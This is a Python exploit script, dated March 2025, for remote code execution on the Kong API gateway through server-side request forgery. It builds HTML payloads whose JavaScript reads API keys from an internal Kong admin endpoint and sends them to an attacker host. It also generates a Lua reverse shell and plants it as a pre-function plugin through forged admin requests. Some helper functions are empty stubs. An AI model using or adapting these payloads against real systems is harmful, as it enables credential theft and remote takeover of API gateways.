"""
Author: Aleksa Zatezalo
Date: March 2025
Description: A remote code execution exploit that leverages SSRF on the Kong API gateway.
"""

import re
import json
import urllib.parse

def log(message):
    """
    Prints a string, message, to standard output.
    """

    pass

def createAPIHTML(lhost):
    """
    Creates HTML for API key exfiltration, replacing the hardcoded IP with lhost.
    
    Args:
        lhost (str): The host to send exfiltrated data to
        
    Returns:
        str: Formatted HTML with the specified host
    """
    html_template = f'''<html>
<head>
<script>
function exfiltrate() {{
    fetch("http://172.16.16.2:8001/key-auths")
    .then((response) => response.text())
    .then((data) => {{
        fetch("http://{lhost}/callback?" + encodeURIComponent(data));
    }}).catch(err => {{
        fetch("http://{lhost}/error?" + encodeURIComponent(err));
    }}); 
}}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>'''
    
    return html_template

def parseForKey(response):
    """
    Extracts the API key from a URL-encoded callback response in a log entry.
    
    Args:
        response (str): Log entry string containing the callback URL with JSON data
        
    Returns:
        str: The extracted API key or None if not found
    """
    # Extract the URL-encoded query parameter using regex
    match = re.search(r'GET /callback\?([^ ]+)', response)
    if not match:
        return None
    
    # URL decode the parameter
    encoded_data = match.group(1)
    decoded_data = urllib.parse.unquote(encoded_data)
    
    try:
        # Parse the JSON data
        data = json.loads(decoded_data)
        
        # Extract the key from the first item in the data array
        if data and 'data' in data and isinstance(data['data'], list) and len(data['data']) > 0:
            for item in data['data']:
                if 'key' in item:
                    return item['key']
        
        return None
    except json.JSONDecodeError:
        return None

def checkPlugins(url, apikey):
    """
    Checks Kong Admin Panel to see if a plugin supporting RCE is enabled on the Admin panel.
    """
    
    pass

def makeShell(lhost, lport):
    """
    Returns a lua revshell for lhost and lport.
    """

    return f"local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"

def formatRCEHTML(lhost, lport):
    """
    Formats HTML RCE code.
    """
    shell = makeShell(lhost, lport)
    
    html_template = f'''<html>
<head>
<script>
function createService() {{
    fetch("http://172.16.16.2:8001/services", {{
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"supersecret", "url": "http://127.0.0.1/"}})
    }}).then(function (route) {{
      createRoute();
    }});
}}
function createRoute() {{
    fetch("http://172.16.16.2:8001/services/supersecret/routes", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"paths": ["/supersecret"]}})
    }}).then(function (plugin) {{
      createPlugin();
    }});  
}}
function createPlugin() {{
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"pre-function", "config" :{{ "access" :[ "{shell}" ]}}}})
    }}).then(function (callback) {{
      fetch("http://{lhost}/callback?setupComplete");
    }});  
}}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>'''
    
    return html_template


def starServer(lport, lhost):
    """
    Starts apache server and moves HTML payload to server.
    """

    pass

def createPlugin(url, lport, lhost):
    """
    Sends a request to get the proper plugin.
    """

    pass

def getRCE(url):
    """
    Self explanitory.
    """

    pass